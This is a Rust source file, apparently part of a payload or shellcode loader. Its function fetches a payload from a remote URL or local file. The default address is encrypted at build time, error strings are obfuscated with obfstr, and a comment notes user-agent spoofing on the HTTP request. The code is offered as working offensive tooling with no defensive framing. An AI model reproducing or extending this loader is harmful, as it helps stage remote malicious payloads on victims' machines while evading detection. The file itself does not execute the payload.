use std::env;
use obfstr::obfstr;
use crate::utils::simple_decrypt;

pub fn load_payload() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let args: Vec<String> = env::args().collect();
    let address = if args.len() < 2 || args[1].is_empty() {
        // Decrypt the encrypted default address
        simple_decrypt(env!("RSL_ENCRYPTED_DEFAULT_PAYLOAD_ADDRESS"))
    } else {
        args[1].clone()
    };

    if address.starts_with("http://") || address.starts_with("https://") {
        // Remote loading with user-agent spoofing
        let (status_code, body) = crate::utils::http_get(&address)?;

        if status_code < 200 || status_code >= 300 {
            return Err(format!("{} {}", obfstr!("Network error:"), status_code).into());
        }
        Ok(body)
    } else {
        // Local file loading with existence check
        let path = std::path::Path::new(&address);
        if !path.exists() {
            return Err(format!("{} {}", obfstr!("Resource unavailable:"), path.display()).into());
        }

        Ok(std::fs::read(&address)?)
    }
}